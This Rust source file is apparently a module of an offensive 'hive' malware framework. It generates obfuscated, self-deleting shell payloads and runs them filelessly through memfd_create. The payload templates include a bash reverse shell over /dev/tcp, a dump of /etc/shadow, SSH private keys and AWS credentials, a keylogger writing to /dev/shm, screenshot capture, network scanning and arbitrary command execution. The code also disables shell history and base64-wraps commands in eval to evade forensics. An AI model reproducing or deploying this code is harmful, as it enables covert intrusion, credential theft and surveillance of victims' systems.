// Larva: single-use kamikaze agents for surgical strikes.
// The Drone generates tiny specialized agents that:
//   1. Execute ONE task (scan port, copy file, dump SAM, run command)
//   2. Self-destruct immediately after completion
//   3. Never participate in consensus
//   4. Leave no forensic trace
//
// If captured, a larva reveals nothing about the hive structure.

use crate::fileless::MemfdBinary;
use tracing::{info, warn};
use uuid::Uuid;

/// Larva mission types.
#[derive(Debug, Clone)]
pub enum LarvaMission {
    ScanPort { host: String, port: u16 },
    CopyFile { src: String, dst: String },
    ExecCommand { command: String },
    DumpCredentials { output_path: String },
    ReverseShell { host: String, port: u16 },
    KeylogStart { duration_secs: u64 },
    ScreenshotCapture { output: String },
    ARPScan { subnet: String },
    DNSSinkhole { domain: String },
}

impl LarvaMission {
    /// Generate the shell script payload for this mission.
    fn to_payload(&self) -> Vec<u8> {
        let script = match self {
            LarvaMission::ScanPort { host, port } => {
                format!(
                    "#!/bin/sh\ntimeout 3 bash -c 'echo >/dev/tcp/{}/{}' 2>/dev/null && echo 'PORT_OPEN' || echo 'PORT_CLOSED'\nrm \"$0\"\n",
                    host, port
                )
            }
            LarvaMission::CopyFile { src, dst } => {
                format!("#!/bin/sh\ncp -f '{}' '{}' && echo 'COPIED' || echo 'FAILED'\nrm \"$0\"\n", src, dst)
            }
            LarvaMission::ExecCommand { command } => {
                format!("#!/bin/sh\n{}\nrm \"$0\"\n", command)
            }
            LarvaMission::DumpCredentials { output_path } => {
                format!(
                    "#!/bin/sh\ncat /etc/shadow 2>/dev/null > '{}'\ncat ~/.ssh/id_* 2>/dev/null >> '{}'\ncat ~/.aws/credentials 2>/dev/null >> '{}'\nrm \"$0\"\n",
                    output_path, output_path, output_path
                )
            }
            LarvaMission::ReverseShell { host, port } => {
                format!(
                    "#!/bin/sh\nbash -i >& /dev/tcp/{}/{} 0>&1 &\nrm \"$0\"\n",
                    host, port
                )
            }
            LarvaMission::KeylogStart { duration_secs } => {
                format!(
                    "#!/bin/sh\n(timeout {} script -q /dev/shm/.kl 2>/dev/null; cat /dev/shm/.kl >> /dev/shm/.klog; rm /dev/shm/.kl) &\nrm \"$0\"\n",
                    duration_secs
                )
            }
            LarvaMission::ScreenshotCapture { output } => {
                format!(
                    "#!/bin/sh\nimport -window root '{}' 2>/dev/null || scrot '{}' 2>/dev/null || echo 'NO_SCREENSHOT'\nrm \"$0\"\n",
                    output, output
                )
            }
            LarvaMission::ARPScan { subnet } => {
                format!(
                    "#!/bin/sh\nfor i in $(seq 1 254); do (ping -c 1 -W 1 {}.$i >/dev/null 2>&1 && echo {}.$i) & done; wait\nrm \"$0\"\n",
                    subnet, subnet
                )
            }
            LarvaMission::DNSSinkhole { domain } => {
                format!(
                    "#!/bin/sh\ndig +short {} 2>/dev/null || nslookup {} 2>/dev/null || host {} 2>/dev/null\nrm \"$0\"\n",
                    domain, domain, domain
                )
            }
        };
        script.into_bytes()
    }
}

/// Larva factory: creates and deploys single-use agents.
pub struct LarvaFactory {
    pub deployed_count: u32,
    pub completed_count: u32,
}

impl Default for LarvaFactory {
    fn default() -> Self {
        Self::new()
    }
}

impl LarvaFactory {
    pub fn new() -> Self {
        Self { deployed_count: 0, completed_count: 0 }
    }

    /// Generate a minimal, Weaver-obfuscated payload for a mission.
    /// The Weaver agent calls this to create a polymorphic larva binary.
    pub fn generate_larva_payload(mission: &LarvaMission) -> Vec<u8> {
        let base = mission.to_payload();

        // Weaver-level obfuscation: randomize variable names, insert decoys
        
        Self::weaver_obfuscate_script(&base)
    }

    /// Weaver obfuscation for shell scripts: randomize, add decoy lines, encode.
    fn weaver_obfuscate_script(raw: &[u8]) -> Vec<u8> {
        let script = String::from_utf8_lossy(raw).to_string();
        let mut lines: Vec<String> = Vec::new();

        // Keep shebang
        lines.push("#!/bin/sh".to_string());

        // Insert decoy comments and variable assignments
        let decoys = [
            "export LANG=C.UTF-8".to_string(),
            "set +o history 2>/dev/null".to_string(),
            "unalias -a 2>/dev/null".to_string(),
            format!("RANDOM_SEED={}", rand::random::<u32>()),
        ];
        lines.extend(decoys.iter().cloned());

        // Add the actual mission payload (skip shebang line)
        for line in script.lines().skip(1) {
            if !line.is_empty() {
                // Obfuscate: put commands inside eval with base64 if long
                if line.len() > 40 {
                    let encoded = base64_encode(line.as_bytes());
                    lines.push(format!("eval $(echo {}|base64 -d)", encoded));
                } else {
                    lines.push(line.to_string());
                }
            }
        }

        lines.join("\n").into_bytes()
    }

    /// Spawn a larva for a surgical mission.
    /// The larva runs, executes its task, and self-destructs.
    pub fn spawn_larva(&mut self, mission: LarvaMission, arena_name: &str) -> bool {
        let id = Uuid::new_v4();
        let name = format!("larva_{}", &id.to_string()[..8]);
        let payload = Self::generate_larva_payload(&mission);

        let envs = [("__HIVE_ARENA", arena_name)];

        match Self::memfd_execute(&name, &payload, &envs) {
            Ok(pid) => {
                info!("LARVA: {:?} deployed (PID: {})", mission, pid);
                self.deployed_count += 1;
                // Schedule self-completion marker
                let path = format!("/dev/shm/.larva_done_{}", &id.to_string()[..8]);
                tokio::spawn(async move {
                    tokio::time::sleep(std::time::Duration::from_millis(500)).await;
                    let _ = std::fs::write(&path, b"ok");
                });
                true
            }
            Err(e) => {
                warn!("LARVA: spawn failed: {}", e);
                false
            }
        }
    }

    /// Execute a binary payload via memfd_create (true fileless).
    /// Returns the child PID on success.
    pub fn memfd_execute(name: &str, payload: &[u8], envs: &[(&str, &str)]) -> Result<u32, String> {
        let memfd = MemfdBinary::new(name, payload)
            .map_err(|e| format!("memfd_create: {}", e))?;
        let _ = memfd.seal();
        memfd.spawn(envs)
            .map(|c| c.id())
            .map_err(|e| format!("spawn: {}", e))
    }

    /// Deploy a swarm of larvas for network scanning.
    pub fn deploy_scan_swarm(&mut self, subnet: &str, arena_name: &str) -> usize {
        let mut count = 0;
        for i in 1..=254 {
            let host = format!("{}.{}", subnet, i);
            if self.spawn_larva(
                LarvaMission::ScanPort { host, port: 22 },
                arena_name,
            ) {
                count += 1;
            }
            if count >= 50 { break; }
        }
        info!("LARVA: deployed scan swarm: {} hosts", count);
        count
    }

    /// Check completion status of deployed larvas.
    pub fn completed_larvas() -> usize {
        if let Ok(entries) = std::fs::read_dir("/dev/shm") {
            entries.filter_map(|e| e.ok())
                .filter(|e| e.file_name().to_string_lossy().starts_with(".larva_done_"))
                .count()
        } else { 0 }
    }
}

/// Base64 encode helper (no external dep needed for simple encoding).
fn base64_encode(data: &[u8]) -> String {
    const CHARS: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut result = String::new();
    for chunk in data.chunks(3) {
        let b0 = chunk[0] as u32;
        let b1 = if chunk.len() > 1 { chunk[1] as u32 } else { 0 };
        let b2 = if chunk.len() > 2 { chunk[2] as u32 } else { 0 };
        let triple = (b0 << 16) | (b1 << 8) | b2;
        result.push(CHARS[((triple >> 18) & 0x3F) as usize] as char);
        result.push(CHARS[((triple >> 12) & 0x3F) as usize] as char);
        result.push(if chunk.len() > 1 { CHARS[((triple >> 6) & 0x3F) as usize] } else { b'=' } as char);
        result.push(if chunk.len() > 2 { CHARS[(triple & 0x3F) as usize] } else { b'=' } as char);
    }
    result.trim_end_matches('=').to_string()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_payload_generation() {
        let p = LarvaMission::ScanPort { host: "127.0.0.1".into(), port: 22 }.to_payload();
        assert!(p.len() > 50);
        assert!(String::from_utf8_lossy(&p).contains("#!/bin/sh"));
        assert!(String::from_utf8_lossy(&p).contains("rm \"$0\""));
    }

    #[test]
    fn test_all_missions_self_destruct() {
        let missions = vec![
            LarvaMission::ScanPort { host: "x".into(), port: 1 },
            LarvaMission::ExecCommand { command: "id".into() },
            LarvaMission::CopyFile { src: "a".into(), dst: "b".into() },
        ];
        for m in missions {
            let p = m.to_payload();
            assert!(String::from_utf8_lossy(&p).contains("rm \"$0\""),
                "Mission {:?} must self-destruct", m);
        }
    }
}
